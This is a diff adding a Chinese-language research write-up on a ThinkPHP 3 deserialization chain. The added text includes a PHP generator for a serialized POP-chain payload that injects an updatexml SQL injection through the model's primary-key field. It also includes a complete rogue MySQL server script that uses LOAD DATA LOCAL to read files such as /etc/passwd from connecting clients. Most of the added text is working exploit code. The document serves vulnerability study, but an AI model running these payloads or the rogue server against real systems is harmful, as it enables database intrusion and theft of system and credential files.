@@ -1534,3 +1534,568 @@ class IndexController extends Controller {
 ```
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202146980.png)
+
+## 反序列化sql注入/读取文件
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $s=I('POST.s');
+        unserialize(base64_decode($s));
+    }
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222033257.png)
+
+```php
+<?php
+namespace Think\Db\Driver{
+    use PDO;
+    class Mysql{
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE => true//允许使用load data local
+        );
+        protected $config = array(
+            "debug"    => 1,
+            "database" => "thinkphp_v3",
+            "hostname" => "127.0.0.1",
+            "hostport" => "3306",
+            "charset"  => "utf8",
+            "username" => "thinkphp_v3",
+            "password" => "thinkphp_v3"
+        );
+    }
+}
+namespace Think {
+    class Model
+    {
+        protected $db = null;
+        protected $trueTableName='user';
+        protected $pk = "id='abc' and updatexml(1,concat(0x7e,(select @@version),0x7e),1);#";
+
+        public function __construct($db)
+        {
+            $this->db=$db;
+        }
+    }
+}
+namespace Think\Image\Driver {
+    class Imagick
+    {
+        private $img;
+
+        public function __construct($img)
+        {
+            $this->img = $img;
+        }
+    }
+}
+
+namespace Think\Session\Driver {
+    class Memcache
+    {
+        protected $sessionName = '';
+        protected $handle = null;
+
+        public function __construct($sessionName, $handle)
+        {
+            $this->sessionName = $sessionName;
+            $this->handle = $handle;
+        }
+
+    }
+}
+
+
+namespace {
+    $db=new Think\Db\Driver\Mysql();
+    $handle=new Think\Model($db);
+    $sessionName="asdf";
+    $memcache = new Think\Session\Driver\Memcache($sessionName,$handle);
+    $s = new Think\Image\Driver\Imagick($memcache);
+    var_dump($s);
+    echo(base64_encode(serialize($s)));
+}
+```
+
+[Mysql连接数据库时可读取文件](https://xz.aliyun.com/t/7169#toc-32)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222134687.png)
+
+[利用脚本](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)
+
+>需要对这个脚本的`Server Greeting`进行一定的修改
+
+```python
+# -*- coding: UTF-8 -*-
+import socket
+import asyncore
+import asynchat
+import struct
+import random
+import logging
+import logging.handlers
+
+
+
+PORT = 3306
+
+log = logging.getLogger(__name__)
+
+log.setLevel(logging.DEBUG)
+tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
+tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
+log.addHandler(
+    tmp_format
+)
+
+filelist = (
+#    r'c:\boot.ini',
+#    r'c:\windows\win.ini',
+#    r'c:\windows\system32\drivers\etc\hosts',
+   '/etc/passwd',
+#    '/etc/shadow',
+)
+
+
+#================================================
+#=======No need to change after this lines=======
+#================================================
+
+__author__ = 'Gifts'
+
+def daemonize():
+    import os, warnings
+    if os.name != 'posix':
+        warnings.warn('Cant create daemon on non-posix system')
+        return
+
+    if os.fork(): os._exit(0)
+    os.setsid()
+    if os.fork(): os._exit(0)
+    os.umask(0o022)
+    null=os.open('/dev/null', os.O_RDWR)
+    for i in xrange(3):
+        try:
+            os.dup2(null, i)
+        except OSError as e:
+            if e.errno != 9: raise
+    os.close(null)
+
+
+class LastPacket(Exception):
+    pass
+
+
+class OutOfOrder(Exception):
+    pass
+
+
+class mysql_packet(object):
+    packet_header = struct.Struct('<Hbb')
+    packet_header_long = struct.Struct('<Hbbb')
+    def __init__(self, packet_type, payload):
+        if isinstance(packet_type, mysql_packet):
+            self.packet_num = packet_type.packet_num + 1
+        else:
+            self.packet_num = packet_type
+        self.payload = payload
+
+    def __str__(self):
+        payload_len = len(self.payload)
+        if payload_len < 65536:
+            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
+        else:
+            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)
+
+        result = "{0}{1}".format(
+            header,
+            self.payload
+        )
+        return result
+
+    def __repr__(self):
+        return repr(str(self))
+
+    @staticmethod
+    def parse(raw_data):
+        packet_num = ord(raw_data[0])
+        payload = raw_data[1:]
+
+        return mysql_packet(packet_num, payload)
+
+
+class http_request_handler(asynchat.async_chat):
+
+    def __init__(self, addr):
+        asynchat.async_chat.__init__(self, sock=addr[0])
+        self.addr = addr[1]
+        self.ibuffer = []
+        self.set_terminator(3)
+        self.state = 'LEN'
+        self.sub_state = 'Auth'
+        self.logined = False
+        # self.push(
+        #     mysql_packet(
+        #         0,
+        #         "".join((
+        #             '\x0a',  # Protocol
+        #             '3.0.0-Evil_Mysql_Server' + '\0',  # Version
+        #             #'5.1.66-0+squeeze1' + '\0',
+        #             '\x36\x00\x00\x00',  # Thread ID
+        #             'evilsalt' + '\0',  # Salt
+        #             '\xdf\xf7',  # Capabilities
+        #             '\x08',  # Collation
+        #             '\x02\x00',  # Server Status
+        #             '\0' * 13,  # Unknown
+        #             'evil2222' + '\0',
+        #         ))
+        #     )
+        # )
+        # 这个Server Greeting太老了
+        self.push(
+            mysql_packet(
+                0,
+                "".join((
+                    '\x0a',
+                    '5.7.37-log' + '\0',
+                    '\x02\x00\x00\x00',
+                    '\x2b\x3a\x31\x7a\x22\x72\x64\x4f\x00',
+                    '\xff\xf7',# 关闭ssl .... 0... .... .... = Switch to SSL after handshake: Not set
+                    '\x2d',
+                    '\x02\x00',
+                    '\xff\xc1',
+                    '\x15',
+                    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+                    '\x6b\x66\x64\x01\x4c\x1e\x0a\x5f\x79\x0d\x27\x5b\x00',
+                    'mysql_native_password' + '\0',
+                ))
+            )
+        )
+        self.order = 1
+        self.states = ['LOGIN', 'CAPS', 'ANY']
+
+    def push(self, data):
+        log.debug('Pushed: %r', data)
+        data = str(data)
+        asynchat.async_chat.push(self, data)
+
+    def collect_incoming_data(self, data):
+        log.debug('Data recved: %r', data)
+        self.ibuffer.append(data)
+
+    def found_terminator(self):
+        data = "".join(self.ibuffer)
+        self.ibuffer = []
+
+        if self.state == 'LEN':
+            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
+            if len_bytes < 65536:
+                self.set_terminator(len_bytes)
+                self.state = 'Data'
+            else:
+                self.state = 'MoreLength'
+        elif self.state == 'MoreLength':
+            if data[0] != '\0':
+                self.push(None)
+                self.close_when_done()
+            else:
+                self.state = 'Data'
+        elif self.state == 'Data':
+            packet = mysql_packet.parse(data)
+            try:
+                if self.order != packet.packet_num:
+                    raise OutOfOrder()
+                else:
+                    # Fix ?
+                    self.order = packet.packet_num + 2
+                if packet.packet_num == 0:
+                    if packet.payload[0] == '\x03':
+                        log.info('Query')
+
+                        filename = random.choice(filelist)
+                        PACKET = mysql_packet(
+                            packet,
+                            '\xFB{0}'.format(filename)
+                        )
+                        self.set_terminator(3)
+                        self.state = 'LEN'
+                        self.sub_state = 'File'
+                        self.push(PACKET)
+                    elif packet.payload[0] == '\x1b':
+                        log.info('SelectDB')
+                        self.push(mysql_packet(
+                            packet,
+                            '\xfe\x00\x00\x02\x00'
+                        ))
+                        raise LastPacket()
+                    elif packet.payload[0] in '\x02':
+                        self.push(mysql_packet(
+                            packet, '\0\0\0\x02\0\0\0'
+                        ))
+                        raise LastPacket()
+                    elif packet.payload == '\x00\x01':
+                        self.push(None)
+                        self.close_when_done()
+                    else:
+                        raise ValueError()
+                else:
+                    if self.sub_state == 'File':
+                        log.info('-- result')
+                        log.info('Result: %r', data)
+
+                        if len(data) == 1:
+                            self.push(
+                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
+                            )
+                            raise LastPacket()
+                        else:
+                            self.set_terminator(3)
+                            self.state = 'LEN'
+                            self.order = packet.packet_num + 1
+
+                    elif self.sub_state == 'Auth':
+                        self.push(mysql_packet(
+                            packet, '\0\0\0\x02\0\0\0'
+                        ))
+                        raise LastPacket()
+                    else:
+                        log.info('-- else')
+                        raise ValueError('Unknown packet')
+            except LastPacket:
+                log.info('Last packet')
+                self.state = 'LEN'
+                self.sub_state = None
+                self.order = 0
+                self.set_terminator(3)
+            except OutOfOrder:
+                log.warning('Out of order')
+                self.push(None)
+                self.close_when_done()
+        else:
+            log.error('Unknown state')
+            self.push('None')
+            self.close_when_done()
+
+
+class mysql_listener(asyncore.dispatcher):
+    def __init__(self, sock=None):
+        asyncore.dispatcher.__init__(self, sock)
+
+        if not sock:
+            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.set_reuse_addr()
+            try:
+                self.bind(('', PORT))
+            except socket.error:
+                exit()
+
+            self.listen(5)
+
+    def handle_accept(self):
+        pair = self.accept()
+
+        if pair is not None:
+            log.info('Conn from: %r', pair[1])
+            tmp = http_request_handler(pair)
+
+
+z = mysql_listener()
+daemonize()
+asyncore.loop()
+```
+
+>不知道为啥,通过`mysql`手动连接可以复现,但在thinkphp里面没有复现出来...
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231543156.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231544750.png)
+
+### __destruct方法
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204221947093.png)
+
+```php
+#ThinkPHP/Library/Think/Image/Driver/Imagick.class.php
+<?php
+namespace Think\Image\Driver;
+use Think\Image;
+class Imagick{
+    /**
+     * 图像资源对象
+     * @var resource
+     */
+    private $img;
+
+    /**
+     * 图像信息，包括width,height,type,mime,size
+     * @var array
+     */
+    private $info;
+
+    /**
+     * 析构方法，用于销毁图像资源
+     */
+    public function __destruct() {
+        empty($this->img) || $this->img->destroy();
+    }
+}
+```
+
+通过`Think\Image\Driver\Imagick`的析构方法可以利用`$this->img->destroy()`对某个对象的`destroy`方法或者`__call`方法进行调用
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204221953929.png)
+
+但是发现`__call`方法没有可以利用的点,即使部分`__call`方法中存在`call_user_func_array`,但存在判断条件如`method_exists`
+
+### destroy方法
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222007548.png)
+
+```php
+#ThinkPHP/Library/Think/Session/Driver/Memcache.class.php
+<?php
+namespace Think\Session\Driver;
+
+class Memcache {
+	protected $lifeTime     = 3600;
+	protected $sessionName  = '';
+	protected $handle       = null;
+
+    /**
+     * 删除Session 
+     * @access public 
+     * @param string $sessID 
+     */
+	public function destroy($sessID) {
+		return $this->handle->delete($this->sessionName.$sessID);
+	}
+}
+```
+
+1. `$this->handle->delete`调用某个对象的`delete`方法
+
+2. `$this->sessionName.$sessID`调用某个对象的`__toString`方法,但是没有发现可以利用的点
+
+### delete方法
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222011716.png)
+
+```php
+#ThinkPHP/Library/Think/Model.class.php
+<?php
+namespace Think;
+/**
+ * ThinkPHP Model模型类
+ * 实现了ORM和ActiveRecords模式
+ */
+class Model {
+    // 当前数据库操作对象
+    protected $db               =   null;#Think\Db\Driver\Mysql
+    // 主键名称
+    protected $pk               =   'id';
+    // 实际数据表名（包含表前缀）
+    protected $trueTableName    =   '';
+    /**
+     * 删除数据
+     * @access public
+     * @param mixed $options 表达式
+     * @return mixed
+     */
+    public function delete($options=array()) {#由于$this->sessionName.$sessID因此$options必定为string类型
+        $pk   =  $this->getPk();#$pk=$this->pk; 说明$pk可由用户输入控制
+        ...
+        if(is_numeric($options)  || is_string($options)) {
+            // 根据主键删除记录
+            if(strpos($options,',')) {
+                $where[$pk]     =  array('IN', $options);
+            }else{
+                $where[$pk]     =  $options;
+            }
+            $options            =  array();
+            $options['where']   =  $where;
+        }
+        ...
+        // 分析表达式
+        $options =  $this->_parseOptions($options);
+        ...      
+        if(is_array($options['where']) && isset($options['where'][$pk])){
+            $pkValue            =  $options['where'][$pk];
+        }
+        ...
+        $result  =    $this->db->delete($options);
+        #进入sql语句执行,$this->db为数据库操作对象
+        #使用Think\Db\Driver\Mysql来生成数据库操作对象
+        #即$this->db设置为Think\Db\Driver\Mysql的对象
+        if(false !== $result && is_numeric($result)) {
+            $data = array();
+            if(isset($pkValue)) $data[$pk]   =  $pkValue;
+            $this->_after_delete($data,$options);
+        }
+        // 返回删除记录个数
+        return $result;
+    }
+
+    /**
+     * 分析表达式
+     * @access protected
+     * @param array $options 表达式参数
+     * @return array
+     */
+    protected function _parseOptions($options=array()) {
+        if(is_array($options))
+            $options =  array_merge($this->options,$options);
+
+        if(!isset($options['table'])){
+            // 自动获取表名
+            $options['table']   =   $this->getTableName();#$options['table']=$this->trueTableName 可控
+            $fields             =   $this->fields;
+        }else{
+            // 指定数据表 则重新获取字段列表 但不支持类型检测
+            $fields             =   $this->getDbFields();
+        }
+        ...
+        // 记录操作的模型名称
+        $options['model']       =   $this->name;
+        ...
+        // 查询过后清空sql表达式组装 避免影响下次查询
+        $this->options  =   array();
+        ...
+        return $options;
+    }
+}
+```
+
+```php
+#ThinkPHP/Library/Think/Db/Driver.class.php
+    /**
+     * 删除记录
+     * @access public
+     * @param array $options 表达式
+     * @return false | integer
+     */
+    public function delete($options=array()) {
+        $this->model  =   $options['model'];
+        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
+        $table  =   $this->parseTable($options['table']);
+        $sql    =   'DELETE FROM '.$table;
+        ...
+        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
+        if(!strpos($table,',')){
+            // 单表删除支持order和limit
+            $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
+            .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
+        }
+        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
+        #经过多个parse函数的分析后,最终生成的$sql为
+        #DELETE FROM `user` WHERE id='abc' and updatexml(1,concat(0x7e,(select @@version),0x7e),1);# = 'Array'
+        #因此最终在execute达成sql注入的目的
+        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
+    }
+```
+
+通过反序列化进行数据库连接,同时通过可控的`$pk`参数构造sql注入
